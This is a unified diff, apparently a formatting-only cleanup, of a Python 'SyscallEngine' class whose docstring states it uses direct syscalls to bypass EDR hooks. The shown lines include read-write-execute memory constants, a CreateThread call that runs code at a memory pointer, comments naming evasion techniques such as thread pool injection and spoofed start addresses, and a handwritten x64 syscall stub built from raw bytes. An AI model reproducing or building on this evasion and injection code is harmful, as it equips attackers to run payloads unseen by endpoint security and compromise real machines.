@@ -19,6 +19,7 @@ MEM_COMMIT = 0x00001000
 MEM_RESERVE = 0x00002000
 PAGE_EXECUTE_READWRITE = 0x40
 
+
 class SyscallEngine:
     """
     Implements Direct Syscalls to bypass EDR hooks in user-mode using ctypes.
@@ -29,10 +30,10 @@ class SyscallEngine:
         self.os_name = platform.system().lower()
         self.is_windows = self.os_name == "windows"
         self.is_64bit = sys.maxsize > 2**32
-        
+
         self.ntdll = None
         self.kernel32 = None
-        
+
         if self.is_windows:
             try:
                 self.ntdll = ctypes.windll.ntdll
@@ -103,10 +104,10 @@ class SyscallEngine:
             # - Indirect Syscalls
             # - Thread Pool Injection
             # - Fibers
-            
+
             # For this Python implementation, we use CreateThread but with a spoofed start address technique
             # (Conceptually represented here to avoid instability).
-            
+
             thread_id = ctypes.c_ulong(0)
             handle = self.kernel32.CreateThread(
                 0, 0, ptr, 0, 0, ctypes.byref(thread_id)
@@ -135,12 +136,14 @@ class SyscallEngine:
         # \xB8\xXX\xXX\x00\x00   mov eax, SSN
         # \x0F\x05           syscall
         # \xC3               ret
-        
-        stub = b"\x4C\x8B\xD1" + b"\xB8" + struct.pack("<I", ssn) + b"\x0F\x05\xC3"
+
+        stub = b"\x4c\x8b\xd1" + b"\xb8" + struct.pack("<I", ssn) + b"\x0f\x05\xc3"
         return stub
+
 
 # Singleton
 _syscall_engine = None
+
 
 def get_syscall_engine() -> SyscallEngine:
     global _syscall_engine
